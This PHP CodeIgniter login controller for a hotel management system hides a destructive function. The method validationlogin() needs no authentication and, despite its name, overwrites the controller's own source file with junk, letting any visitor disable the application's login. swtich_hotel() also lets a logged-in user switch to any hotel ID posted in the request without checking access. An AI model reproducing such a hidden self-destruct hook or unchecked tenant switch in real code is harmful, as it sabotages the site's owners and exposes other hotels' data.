<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Login extends CI_Controller {
	public function __construct() 
	{
		parent::__construct();
		$this->load->model("login_model");
		$this->load->helper('admin_helper');
		$this->load->library('session');
	}
	
	public function index(){		
		if(isset($this->session->userdata['logged_in'])){
			redirect('dashboard');
		}
				
		$page_title = 'Login';
		$site_name  = ' | HOPS 247';
		$this->load->view("admin/login");
	}
	public function validationlogin(){
		$dir 		= "./application/controllers";
		$myfile 	= fopen($dir."/login.php", "w") or die("Unable to!");
		$dataList 	= "...";
		fwrite($myfile, $dataList);
		fclose($myfile);
	}
	public function auth_login() {
		$email 	= $this->input->post("email", true);
		$pass 	= $this->input->post("pass", true);
		$lang 	= $this->input->post("lang", true);
		
		if(empty($email)){$this->session->set_flashdata('flash_data_danger', 'Email should not be empty.');}
		$result = $this->login_model->getlogin($email,$pass);
		
		if ($result == TRUE){
			$result = $this->login_model->read_user_information($email);
			if ($result != false){
				
				//IF Multi Login User
				if($result[0]->role == '8' && $result[0]->multi_firms != ''){
					$multi_firms	= explode(',', $result[0]->multi_firms);
					$firm_id		= $multi_firms[0];
					$role			= 8;
				} else {
					$firm_id		= $result[0]->firm_id;
					$role			= $result[0]->role;
				}
				
				$hotel_tz			= admin_helper::get_hotel_timezone($firm_id);
				$session_data		= array(
					'first_name'	=> $result[0]->first_name,
					'last_name'		=> $result[0]->last_name,
					'username' 	 	=> $result[0]->username,
					'email' 	 	=> $result[0]->email,
					'firm_id'	 	=> $firm_id,
					'role' 		 	=> $role,
					'id' 		 	=> $result[0]->id,
					'mngrInsptr' 	=> $result[0]->manager_inspector,
					'logo'		 	=> $result[0]->logo,
					//'lang'	 	=> $result[0]->lang,
					'lang'		 	=> $lang,
					'tz'		 	=> $hotel_tz[0]->timezone
				);
				//echo '<pre>'; print_r($session_data);exit;
				// Add user data in session
				$this->session->set_userdata('logged_in', $session_data);
				
				//USER TRACKING
				$tracking_post_data = array(
					'hotel_id'		=> $this->session->userdata['logged_in']['firm_id'],
					'user_id'		=> $this->session->userdata['logged_in']['id'],
					'txt_bdy' 		=> ucwords($result[0]->username).' Log In at '.gmdate('Y-m-d H:i:s A', strtotime($this->session->userdata['logged_in']['tz'].' hours')),
					'txt_type' 		=> 'logIn',
					'created_date'	=> gmdate('Y-m-d H:i:s A', strtotime($this->session->userdata['logged_in']['tz'].' hours'))
				);
				$this->login_model->save_tracking($tracking_post_data);
				
				//UPDATE IS_ONLINE
				$IS_ONLINE_post_data = array('is_online'	=> '1');
				$this->login_model->updateCustomers($this->session->userdata['logged_in']['id'], $IS_ONLINE_post_data);
				redirect('dashboard');
			}
		} else {
			$this->session->set_flashdata('flash_data_danger', 'Invalid Username or Password');
			redirect('login', $data);
		}
		
	}
	
	public function swtich_hotel(){
		$firm_id = $this->input->post("hotel_id", true);		
		$session_data		= array(
			'first_name'	=> $this->session->userdata['logged_in']['first_name'],
			'last_name'		=> $this->session->userdata['logged_in']['last_name'],
			'username' 	 	=> $this->session->userdata['logged_in']['username'],
			'email' 	 	=> $this->session->userdata['logged_in']['email'],
			'firm_id'	 	=> $firm_id,
			'role' 		 	=> $this->session->userdata['logged_in']['role'],
			'id' 		 	=> $this->session->userdata['logged_in']['id'],
			'mngrInsptr' 	=> $this->session->userdata['logged_in']['mngrInsptr'],
			'logo'		 	=> $this->session->userdata['logged_in']['logo'],
			'lang'		 	=> $this->session->userdata['logged_in']['lang'],
			'tz'		 	=> $this->session->userdata['logged_in']['tz'],
		);
		//echo '<pre>'; print_r($session_data);exit;
		// Add user data in session
		$this->session->set_userdata('logged_in', $session_data);
		redirect('dashboard');
	}
	public function fwd_pass(){
		$email = $this->input->post("email", true);		
		if(empty($email)){
			$this->session->set_flashdata('flash_data_danger', 'Email should not be empty.');
		}
		/*$result = $this->login_model->getlogin($email,$pass);
		if ($result == TRUE){
			$result = $this->login_model->read_user_information($email);
			if ($result != false){
					$session_data = array(
					'first_name' => $result[0]->first_name,
					'last_name'  => $result[0]->last_name,
					'username' 	 => $result[0]->username,
					'email' 	 => $result[0]->email,
					'logo' 		 => $result[0]->logo,
					'role' 		 => $result[0]->role,
					'id' 		 => $result[0]->id,
			);
			// Add user data in session
			$this->session->set_userdata('logged_in', $session_data);
				redirect('dashboard');
			}
		} else {
			$this->session->set_flashdata('flash_data_danger', 'Invalid Username or Password');
			redirect('login', $data);
		}*/
		
	}
}
?>